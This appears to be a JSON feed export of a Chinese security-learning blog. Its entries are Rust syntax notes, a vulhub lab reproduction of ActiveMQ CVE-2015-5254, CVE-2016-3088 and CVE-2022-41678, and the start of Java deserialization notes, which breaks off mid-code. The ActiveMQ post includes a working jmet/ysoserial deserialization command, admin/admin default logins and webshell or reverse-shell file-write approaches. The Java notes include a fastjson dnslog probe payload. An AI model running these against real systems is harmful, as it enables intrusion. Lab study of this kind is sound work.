个不同的结构体作为参数。</p>\n<p>而且从代码规范角度来看，枚举的实现更简洁，代码内聚性更强，不像结构体的实现，分散在各个地方。</p>\n<h3 id=\"同一化类型\"><a class=\"anchor\" href=\"#同一化类型\">#</a> 同一化类型：</h3>\n<p>最后，再用一个实际项目中的简化片段，来结束枚举类型的语法学习。</p>\n<p>例如我们有一个 WEB 服务，需要接受用户的长连接，假设连接有两种： <code>TcpStream</code>  和  <code>TlsStream</code> ，但是我们希望对这两个连接的处理流程相同，也就是用同一个函数来处理这两个连接，代码如下：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span> <span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">:</span> <span class=\"token class-name\">TcpStream</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> s <span class=\"token operator\">=</span> stream<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">if</span> tls <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s <span class=\"token operator\">=</span> <span class=\"token function\">negotiate_tls</span><span class=\"token punctuation\">(</span>stream<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">//websocket 是一个 WebSocket&lt;TcpStream > 或者</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token comment\">//   WebSocket&lt;native_tls::TlsStream&lt;TcpStream>> 类型</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  websocket <span class=\"token operator\">=</span> <span class=\"token class-name\">WebSocket</span><span class=\"token punctuation\">::</span><span class=\"token function\">from_raw_socket</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    s<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">...</span><span class=\"token punctuation\">...</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>此时，枚举类型就能帮上大忙：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Websocket</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token class-name\">Tcp</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Websocket</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">TcpStream</span><span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">Tls</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Websocket</span><span class=\"token operator\">&lt;</span><span class=\"token namespace\">native_tls<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">TlsStream</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">TcpStream</span><span class=\"token operator\">>></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"option枚举用于处理空值\"><a class=\"anchor\" href=\"#option枚举用于处理空值\">#</a> option 枚举用于处理空值：</h3>\n<p>在其它编程语言中，往往都有一个  <code>null</code>  关键字，该关键字用于表明一个变量当前的值为空（不是零值，例如整型的零值是 0），也就是不存在值。当你对这些  <code>null</code>  进行操作时，例如调用一个方法，就会直接抛出 <strong>null 异常</strong>，导致程序的崩溃，因此我们在编程时需要格外的小心去处理这些  <code>null</code>  空值。</p>\n<h5 id=\"rust-的做法-optiont\"><a class=\"anchor\" href=\"#rust-的做法-optiont\">#</a> Rust 的做法 ——  <code>Option&lt;T&gt;</code></h5>\n<p>Rust 直接<strong>去掉了  <code>null</code> </strong>，用  <code>Option&lt;T&gt;</code>  这个枚举类型来表示 “可能有值，也可能没值” 的情况。</p>\n<pre><code>rust复制编辑enum Option&lt;T&gt; &#123;\n    Some(T), // 代表有值\n    None,    // 代表没有值\n&#125;\n</code></pre>\n<ul>\n<li><code>Some(T)</code>  代表有值，比如  <code>Some(5)</code>  就表示  <code>5</code>  这个数。</li>\n<li><code>None</code>  代表没有值，相当于  <code>null</code> ，但它是  <code>Option&lt;T&gt;</code>  类型的一部分，不能直接使用。</li>\n</ul>\n<p>Rust 这样设计的好处是：<strong>你必须显式处理可能的空值，防止程序出错！</strong></p>\n<h5 id=\"例子定义-optiont-变量\"><a class=\"anchor\" href=\"#例子定义-optiont-变量\">#</a> 例子：定义  <code>Option&lt;T&gt;</code>  变量</h5>\n<pre><code>rust复制编辑let some_number = Some(5);\nlet some_string = Some(&quot;Hello&quot;);\n\nlet absent_number: Option&lt;i32&gt; = None; // 需要指定类型\n</code></pre>\n<p>如果是  <code>None</code> ，Rust 需要知道  <code>Option&lt;T&gt;</code>  的  <code>T</code>  是什么类型，比如  <code>Option&lt;i32&gt;</code> ，否则它不知道  <code>None</code>  代表什么类型。</p>\n<h5 id=\"为什么-optiont-比-null-好\"><a class=\"anchor\" href=\"#为什么-optiont-比-null-好\">#</a> 为什么  <code>Option&lt;T&gt;</code>  比  <code>null</code>  好？</h5>\n<p>因为 <strong> <code>Option&lt;T&gt;</code>  和  <code>T</code>  是不同的类型</strong>，Rust 不允许直接把  <code>Option&lt;T&gt;</code>  当作普通值使用，这样能防止你意外访问  <code>None</code> 。</p>\n<p>来看这个例子：</p>\n<pre><code>rust复制编辑let x: i8 = 5;\nlet y: Option&lt;i8&gt; = Some(5);\n\nlet sum = x + y; // ❌ 不能直接相加！\n</code></pre>\n<p>错误信息：</p>\n<pre><code>rust\n\n\n复制编辑\nno implementation for `i8 + Option&lt;i8&gt;`\n</code></pre>\n<p>Rust 不允许直接把  <code>Option&lt;i8&gt;</code>  当作  <code>i8</code> ，必须先处理  <code>Option</code> ，确保它有值。</p>\n<h5 id=\"如何取出-optiont-的值\"><a class=\"anchor\" href=\"#如何取出-optiont-的值\">#</a> 如何取出  <code>Option&lt;T&gt;</code>  的值？</h5>\n<p>你必须<strong>显式地</strong>告诉 Rust 如何处理  <code>None</code> ，避免程序崩溃。可以用  <code>match</code>  语句来处理：</p>\n<pre><code>rust复制编辑fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123;\n    match x &#123;\n        Some(i) =&gt; Some(i + 1), // 有值时 +1\n        None =&gt; None,            // 没有值，返回 None\n    &#125;\n&#125;\n\nlet five = Some(5);\nlet six = plus_one(five); // six 是 Some(6)\nlet none = plus_one(None); // 仍然是 None\n</code></pre>\n<p>这里  <code>match</code>  确保了：</p>\n<ul>\n<li>如果  <code>x</code>  里有值（ <code>Some(i)</code> ），就加 1。</li>\n<li>如果  <code>x</code>  是  <code>None</code> ，就保持  <code>None</code> ，避免出错。</li>\n</ul>\n<h2 id=\"数组\"><a class=\"anchor\" href=\"#数组\">#</a> 数组</h2>\n<p>两种数组：第一种是速度快但是长度固定的 array，一种是可动态增长的 Vector（动态数组）</p>\n<p>这两个跟 &amp; str 和 String 很像</p>\n<p>数组的三要素：</p>\n<pre><code>长度固定\n元素必须有相同的类型\n依次线性排列\n</code></pre>\n<p>数组越界会直接报错</p>\n<p>数组的赋值：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">:</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//let a:[i32;3]=[4,4,4];</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>这里仅限于基础类型，如果是复杂类型</p>\n<p>就得这样写：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:#?&#125;\"</span><span class=\"token punctuation\">,</span> array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>也可以调用 std::array::from_fn</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> array<span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>array<span class=\"token punctuation\">::</span></span><span class=\"token function\">from_fn</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span>_i<span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:#?&#125;\"</span><span class=\"token punctuation\">,</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token string\">\"rust is good!\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"数组切片\"><a class=\"anchor\" href=\"#数组切片\">#</a> 数组切片：</h3>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> a<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span> slice<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">..</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\">assert_eq!</span><span class=\"token punctuation\">(</span>slice<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"流程控制\"><a class=\"anchor\" href=\"#流程控制\">#</a> 流程控制</h2>\n<p>语法:</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> condition<span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//A...</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//B...</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>但是 if 和 else 返回值不统一时会报错（用 if 赋值时）</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token keyword\">else</span></pre></td></tr></table></figure><p>for 循环：</p>\n<figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">1</span><span class=\"token punctuation\">..=</span><span class=\"token number\">5</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "学习笔记",
                "buuctf",
                "rust"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/03/18/activeMQ/",
            "url": "http://odiws.github.io/2025/03/18/activeMQ/",
            "title": "CVE-2015-5254",
            "date_published": "2025-03-18T12:59:11.000Z",
            "content_html": "<h2 id=\"activemq\"><a class=\"anchor\" href=\"#activemq\">#</a> activeMQ</h2>\n<p>前言：不知道改学些什么，就按 vulhub 里面的 CVE 漏洞来复现算了</p>\n<h3 id=\"cve-2015-5254jmet\"><a class=\"anchor\" href=\"#cve-2015-5254jmet\">#</a> CVE-2015-5254：jmet</h3>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504201946995.png\" alt=\"image-20250420194626856\" /></p>\n<p>这里就是主页，可以进行扫目录，有 admin，然后就是 admin/admin 弱密码登录</p>\n<p>在 /admin/queues.jsp 这里就有反序列化漏洞，用 jmet 这个工具即可直接反序列化，但是需要点击这个 id 才会有反序列化生成</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504201948098.png\" alt=\"image-20250420194834023\" /></p>\n<h4 id=\"jmet安装使用得用jdk8\"><a class=\"anchor\" href=\"#jmet安装使用得用jdk8\">#</a> jmet 安装 (使用得用 jdk8）</h4>\n<pre><code>#下载jmet的jar包\nwget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar\n#创建external目录\nmkdir external\n</code></pre>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>使用</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">java</span> <span class=\"token parameter variable\">-jar</span> jmet-0.1.0-all.jar <span class=\"token parameter variable\">-Q</span> event <span class=\"token parameter variable\">-I</span> ActiveMQ <span class=\"token parameter variable\">-s</span> <span class=\"token parameter variable\">-Y</span> <span class=\"token string\">\"touch /tmp/sucess\"</span> <span class=\"token parameter variable\">-Yp</span> ROME <span class=\"token number\">192.200</span>.30.72 <span class=\"token number\">61616</span></pre></td></tr></table></figure><pre><code>【命令解释】：调用java -jar 运行 jmet的jar包，-Q是插入一个名为event的队列，-I 是选择装载ActiveMQ模块 ，-s 是选择ysoserial payload ，-Y 是攻击模式和内容， -Yp 是选择攻击利用链，这里的选择是ROME， 之后带上IP加端口。\n-Q 比如我修改event为hack 就成为插入一个名为hack的队列。\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504201951696.png\" alt=\"image-20250420195149625\" /></p>\n<p>生成这样的就好了</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504201952664.png\" alt=\"image-20250420195206585\" /></p>\n<p>在这里就会有一个队列 event 生成</p>\n<p>得点击里面的 id 才能触发</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504201953052.png\" alt=\"image-20250420195308012\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504201954388.png\" alt=\"image-20250420195457325\" /></p>\n<p>复现成功</p>\n<h4 id=\"补充\"><a class=\"anchor\" href=\"#补充\">#</a> 补充：</h4>\n<p>我开的这个 docker 容器的东西不是和我本身的机器共享的</p>\n<pre><code>进入我开的这个容器的指令：\ndocker exec -it [容器ID] bash\n容器id怎么拿：\ndocker ps\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504201957635.png\" alt=\"image-20250420195722589\" /></p>\n<p>第一个 id 就是了</p>\n<h3 id=\"cve-2016-3088任意文件写入\"><a class=\"anchor\" href=\"#cve-2016-3088任意文件写入\">#</a> CVE-2016-3088 任意文件写入</h3>\n<p>背景简述：<br />\nAcctive 的 web 控制台分为三个应用，admin，api 和 fileserver，其中 admin 是管理员页面，api 是接口，fileserver 是储存文件的接口；admin 和 api 都需要登录后才能使用，fileserver 无需登录。</p>\n<p>fileserver 是一个 ESful API 接口，我们可以通过 GET，PUT，DELETE 等 HTTP 请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输，存储二进制文件的缺陷，但后来发现：</p>\n<pre><code>其使用率不高\n文件操作容易出现漏洞\n</code></pre>\n<p>所以，ActiveMQ 在 5.12.x-&gt;5.13.x 版本中，已经默认关闭了 file server 这个应用（可以在 conf/jetty。xml 中开启）；在 5.14.0 版本以后，彻底删除了 fileserver 这个应用</p>\n<p>在测试过程中，可以关注 ActiveMQ 的版本，避免走弯路。</p>\n<h4 id=\"漏洞详情\"><a class=\"anchor\" href=\"#漏洞详情\">#</a> 漏洞详情：</h4>\n<p>本漏洞出现在 fileserver 应用中，fileserver 支持写入文件（但是不解析 jsp），同时是吃移动文件（MOVE 请求），所以，我们只需要写入一个文件，然后使用 MOVE 请求将其移动到人难以位置，造成任意文件写入漏洞。</p>\n<h4 id=\"文件写入的几种利用方法\"><a class=\"anchor\" href=\"#文件写入的几种利用方法\">#</a> 文件写入的几种利用方法</h4>\n<pre><code>写入webshell    方便，但是这里不解析，而且admin和api两个应用都需要登录才能访问\n写入cron或sshj key等文件  直接反弹拿shell，但是需要root权限\n写入jar或jetty.xml等库和配置文件   麻烦，但是靠谱\n</code></pre>\n<h4 id=\"知识扩展\"><a class=\"anchor\" href=\"#知识扩展\">#</a> 知识扩展：</h4>\n<pre><code>cron是什么\n\n反弹shell是什么\n\ncron或ssh key和反弹shell的关系\n\njetty和jetty.xml是什么\n\nlinux文件权限\n</code></pre>\n<p>复现失败，原因是上传不上去，只有将 jsp 一句话木马 url 一下后才能上传，但是这个网页不解码，就离谱，我们直接下一个，这个以后才说</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxNjgzNjUzL2FydGljbGUvZGV0YWlscy8xMjkyNDA1Mjg=\">【vulhub 漏洞复现】CVE-2016-3088 ActiveMQ 任意文件写入漏洞 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaHVhbmd4aWFvc2FuL3AvMTQyMjI2OTQuaHRtbA==\">CVE-2016-3088（ActiveMQ 任意文件写入漏洞） - toby123 - 博客园</span></p>\n<h3 id=\"cve-2022-41678远程rce\"><a class=\"anchor\" href=\"#cve-2022-41678远程rce\">#</a> CVE-2022-41678：远程 rce</h3>\n<p>介绍：CVE-2022-41678 是一个 Apache ActiveMQ 中的远程代码执行漏洞，其主要原理是利用 Jolokia 服务中的不当配置。<strong>Jolokia</strong> 是一个 JMX 通过 HTTP 的桥接服务，允许通过 HTTP 请求来操作 JMX MBEANS。在手影响的 Apache ActiveMQ 版本中，经过身份验证的用户可以通过 /api/jolokia/ 接口操作 MBean。</p>\n<h4 id=\"理论\"><a class=\"anchor\" href=\"#理论\">#</a> 理论：</h4>\n<p>漏洞核心是 FlightRecorder MBean，这是 JDK11 及以上版本中提供的一个功能，用于记录内存，垃圾回收，调用栈等等信息。攻击者可以利用一下方法进行攻击：</p>\n<p>newRecording - 新键一个记录绘画</p>\n<p>setConfiguration - 更改记录会话的配置</p>\n<p>startRecording - 开始记录</p>\n<p>stopRecording - 结束记录</p>\n<p>copyTo - 将记录的数据导出到文件。</p>\n<p>攻击者可以通过 setConfiguration 方法修改配置，将一些键名改为 JSP 段代码。这样，在记录的数据中就会包含攻击者注入的 JSP 代码。然后，攻击者使用 copyTo 方法将包含恶意代码的记录导出到 ActivveMQ 的 web 目录中，从而在服务器上执行远程代码。</p>\n<h4 id=\"要求\"><a class=\"anchor\" href=\"#要求\">#</a> 要求：</h4>\n<p>需要我们能登录后台管理界面，通常是 8161 端口登录，admin/admin</p>\n<h4 id=\"漏洞复现\"><a class=\"anchor\" href=\"#漏洞复现\">#</a> 漏洞复现：</h4>\n<h5 id=\"1查看所有mbean\"><a class=\"anchor\" href=\"#1查看所有mbean\">#</a> 1. 查看所有 Mbean</h5>\n<p>使用 Bp 进行抓包，访问 “/api/jolokia/list” 这个 api 可以查看当前服务器里所有的 MBeans（路径改为 **/api/jolokia/list**, 然后添加<strong> Request-header</strong>：Origin:<span class=\"exturl\" data-url=\"aHR0cDovL2lw\">http://ip</span>）</p>\n<p><strong>注意后面必须要有两行空行，不然回显不了</strong></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504222015401.png\" alt=\"image-20250422201545238\" /></p>\n<p>获取 MBean 值：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504222020292.png\" alt=\"image-20250422202048134\" /></p>\n",
            "tags": [
                "漏洞复现",
                "vulhub",
                "ActiveMQ"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "url": "http://odiws.github.io/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/",
            "title": "java反序列化学习笔记",
            "date_published": "2025-02-19T11:34:08.000Z",
            "content_html": "<h2 id=\"java反序列化\"><a class=\"anchor\" href=\"#java反序列化\">#</a> java 反序列化</h2>\n<p>漏洞挖掘：<br />\n1. 找到发送 JSON 序列化数据的接口<br />\n 2 判断是否使用 fastjson</p>\n<ol>\n<li>非法格式报错<br />\n {&quot;x&quot;:&quot;<br />\n2) 使用 dnslog 探测<br />\n {&quot;x&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;<span class=\"exturl\" data-url=\"aHR0cDovL3h4eC5kbnNsb2cuY24=\">xxx.dnslog.cn</span>&quot;)}<br />\n Burp 插件<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ppbG9uZzMwMzMvZmFzdGpzb25TY2Fu\"> https://github.com/zilong3033/fastjsonScan</span></li>\n</ol>\n<p>反序列化工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs\">GitHub - frohoff/ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs\">ysoserial</span></p>\n<h3 id=\"urldns\"><a class=\"anchor\" href=\"#urldns\">#</a> URLDNS:</h3>\n<p>用该工具的 payload：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>payloads</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InetAddress</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URLConnection</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URLStreamHandler</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td 